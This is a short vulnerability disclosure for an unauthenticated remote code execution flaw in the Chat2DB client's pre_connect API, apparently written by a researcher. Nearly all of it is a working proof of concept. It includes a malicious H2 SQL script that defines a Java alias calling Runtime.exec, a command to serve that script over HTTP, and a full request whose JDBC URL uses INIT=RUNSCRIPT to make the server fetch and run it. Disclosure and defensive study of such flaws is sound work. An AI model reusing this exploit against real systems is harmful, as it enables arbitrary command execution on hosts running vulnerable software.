# Chat2DB H2 JDBC Driver Remote Code Execute Vulnerability

**Creatorï¼š**zack



## Description

The REST API of Chat2DB (/api/connection/datasource/pre_connect) has a remote code execution vulnerability that occurs when an unauthenticated H2 JDBC connection is used.

## Proof of Concept

1. Download the Chat2DB client and run it [Chat2DB Client](https://github.com/CodePhiliaX/Chat2DB/releases/tag/v0.3.7)
2. Use Python to start an HTTP service for accessing our malicious SQL script file.

```sql
#poc.sql
CREATE ALIAS COMMAND_EXEC AS $$ String commandExec(String cmd) throws java.io.IOException {
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL COMMAND_EXEC('calc')
```

```
python -m http.server 8888 --bind 0.0.0.0
```

3. Use the following POC to send the request

```
POST /api/connection/datasource/pre_connect HTTP/1.1
Host: 127.0.0.1:10824
Content-Length: 449
Accept: application/json
Content-Type: application/json
User-Agent: aaa
sec-ch-ua-platform: "custom"
Origin: http://127.0.0.1:10824
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:10824/connections
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: dsfsdfd
Connection: keep-alive

{"ssh":{"use":false,"hostName":"","port":"22","userName":"","localPort":"","authenticationType":"password","password":""},"alias":"@localhost","environmentId":1,"host":"localhost","port":"9092","serviceType":"TCP","authenticationType":"1","user":"root","password":"test","database":"test","url":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/poc.sql'","extendInfo":[],"connectionEnvType":"DAILY","type":"H2"}
```

4. Successful remote code execution

![image-20250613195234510](D:\notes\notes-software\typora\Typora\data\Chat2DB H2 JDBC Driver Remote Code Execute Vulnerability\image-20250613195234510.png)